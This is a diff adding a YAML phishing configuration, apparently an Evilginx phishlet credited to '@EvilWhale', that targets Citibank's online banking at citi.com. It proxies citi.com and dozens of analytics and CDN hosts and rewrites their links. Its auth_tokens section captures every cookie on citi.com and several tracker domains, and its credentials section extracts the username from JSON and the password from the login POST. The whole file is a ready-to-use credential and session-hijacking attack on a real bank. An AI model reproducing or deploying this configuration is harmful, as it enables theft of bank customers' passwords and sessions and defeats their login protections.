@@ -1,0 +1,175 @@
+author: "@EvilWhale"
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'citi.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'p11', orig_sub: 'p11', domain: 'techlab-cdn.com', session: true, is_landing:false, auto_filter: false}
+  - {phish_sub: 'idsync', orig_sub: 'idsync', domain: 'rlcdn.com', session: true, is_landing:false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'rlcdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content22.online', orig_sub: 'content22.online', domain: 'citi.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'nexus', orig_sub: 'nexus', domain: 'ensighten.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'code', orig_sub: 'code', domain: 'jquery.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'gbqofs.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'contents2.00110', orig_sub: 'contents2.00110', domain: 'citi.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mboxedge37.tt', orig_sub: 'mboxedge37.tt', domain: 'omtrdc.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '1', orig_sub: '1', domain: 'a79ab95c1589a13f8a4cab612bc71f9f7.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '1', orig_sub: '1', domain: 'b406929acabac9b095f124c81bdfcf57f.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '1', orig_sub: '1', domain: 'c81358859121583b7adf2ace89cb39f44.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '1', orig_sub: '1', domain: 'a79ab95c1589a13f8a4cab612bc71f9f7.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'prod.report.nacustomerexperience', orig_sub: 'prod.report.nacustomerexperience', domain: 'citi.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'online', orig_sub: 'online', domain: 'citi.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'aemapi', orig_sub: 'aemapi', domain: 'citi.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'zn3vi8kkuds0jjrfc-citifeedback.siteintercept', orig_sub: 'zn3vi8kkuds0jjrfc-citifeedback.siteintercept', domain: 'qualtrics.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'c1', orig_sub: 'c1', domain: 'rfihub.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'live', orig_sub: 'live', domain: 'rezync.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sr', orig_sub: 'sr', domain: 'rlcdn.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 'tvpixel.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 's', orig_sub: 's', domain: 'amazon-adsystem.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'data.privacy', orig_sub: 'data.privacy', domain: 'ensighten.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'p', orig_sub: 'p', domain: 'rfihub.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'p', orig_sub: 'p', domain: 'tvpixel.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sb', orig_sub: 'sb', domain: 'scorecardresearch.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'metrics1', orig_sub: 'metrics1', domain: 'citi.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'boomtrain.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'people.api', orig_sub: 'people.apip', domain: 'boomtrain.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'h', orig_sub: 'h', domain: 'online-metrix.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'h64', orig_sub: 'h64', domain: 'online-metrix.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '89oebq5k5fugypubyciwwd7p2eqa5ehwg57f4vqa0327bcaa7a0341e7am1.e.aa', orig_sub: '89oebq5k5fugypubyciwwd7p2eqa5ehwg57f4vqa0327bcaa7a0341e7am1.e.aa', domain: 'online-metrix.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'contents1.00110', orig_sub: 'contents1.00110', domain: 'citi.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'boomtrain.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'ipify.org', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '6269322.fls', orig_sub: '6269322.fls', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'contents3.00110', orig_sub: 'contents3.00110', domain: 'citi.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'tagmanager1.undefined', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'online.online', orig_sub: 'online.online', domain: 'citi.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.citi.com', orig_sub: 'www', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'p11', domain: 'techlab-cdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'idsync', domain: 'rlcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'api', domain: 'rlcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'content22.online', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'nexus', domain: 'ensighten.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'code', domain: 'jquery.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'cdn', domain: 'gbqofs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'contents2.00110', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'mboxedge37.tt', domain: 'omtrdc.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: '1', domain: 'a79ab95c1589a13f8a4cab612bc71f9f7.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: '1', domain: 'b406929acabac9b095f124c81bdfcf57f.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: '1', domain: 'c81358859121583b7adf2ace89cb39f44.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: '1', domain: 'a79ab95c1589a13f8a4cab612bc71f9f7.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'www.citi.com', orig_sub: 'prod.report.nacustomerexperience', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'online', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'aemapi', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'zn3vi8kkuds0jjrfc-citifeedback.siteintercept', domain: 'qualtrics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'c1', domain: 'rfihub.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'live', domain: 'rezync.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'sr', domain: 'rlcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'c', domain: 'tvpixel.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 's', domain: 'amazon-adsystem.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'data.privacy', domain: 'ensighten.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'p', domain: 'rfihub.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'p', domain: 'tvpixel.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'sb', domain: 'scorecardresearch.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'metrics1', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'cdn', domain: 'boomtrain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'people.api', domain: 'boomtrain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'h', domain: 'online-metrix.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'h64', domain: 'online-metrix.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: '89oebq5k5fugypubyciwwd7p2eqa5ehwg57f4vqa0327bcaa7a0341e7am1.e.aa', domain: 'online-metrix.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'contents1.00110', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'events.api', domain: 'boomtrain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'api', domain: 'ipify.org', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: '6269322.fls', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'contents3.00110', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: '', domain: 'tagmanager1.undefined', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.citi.com', orig_sub: 'online.online', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'www', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'p11', domain: 'techlab-cdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'idsync', domain: 'rlcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'api', domain: 'rlcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'content22.online', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'nexus', domain: 'ensighten.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'code', domain: 'jquery.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'cdn', domain: 'gbqofs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'contents2.00110', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'mboxedge37.tt', domain: 'omtrdc.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: '1', domain: 'a79ab95c1589a13f8a4cab612bc71f9f7.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: '1', domain: 'b406929acabac9b095f124c81bdfcf57f.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: '1', domain: 'c81358859121583b7adf2ace89cb39f44.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: '1', domain: 'a79ab95c1589a13f8a4cab612bc71f9f7.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'prod.report.nacustomerexperience', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'online', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'aemapi', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'zn3vi8kkuds0jjrfc-citifeedback.siteintercept', domain: 'qualtrics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'c1', domain: 'rfihub.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'live', domain: 'rezync.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'sr', domain: 'rlcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'c', domain: 'tvpixel.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 's', domain: 'amazon-adsystem.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'data.privacy', domain: 'ensighten.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'p', domain: 'rfihub.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'p', domain: 'tvpixel.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'sb', domain: 'scorecardresearch.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'metrics1', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'cdn', domain: 'boomtrain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'people.api', domain: 'boomtrain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'h', domain: 'online-metrix.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'h64', domain: 'online-metrix.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: '89oebq5k5fugypubyciwwd7p2eqa5ehwg57f4vqa0327bcaa7a0341e7am1.e.aa', domain: 'online-metrix.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'contents1.00110', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'events.api', domain: 'boomtrain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'api', domain: 'ipify.org', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: '6269322.fls', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'contents3.00110', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: '', domain: 'tagmanager1.undefined', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.citi.com', orig_sub: 'online.online', domain: 'citi.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.citi.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'prod.report.nacustomerexperience.citi.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.tt.omtrdc.net'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'www.citi.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.rlcdn.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'live.rezync.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.tvpixel.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'content22.online.citi.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.scorecardresearch.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+#  - '/'
+  - '/login'
+
+credentials:
+  username:
+    key: 'userId'
+    search: '"userId":"([^"]+)"'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.citi.com'
+  path: '/'
+
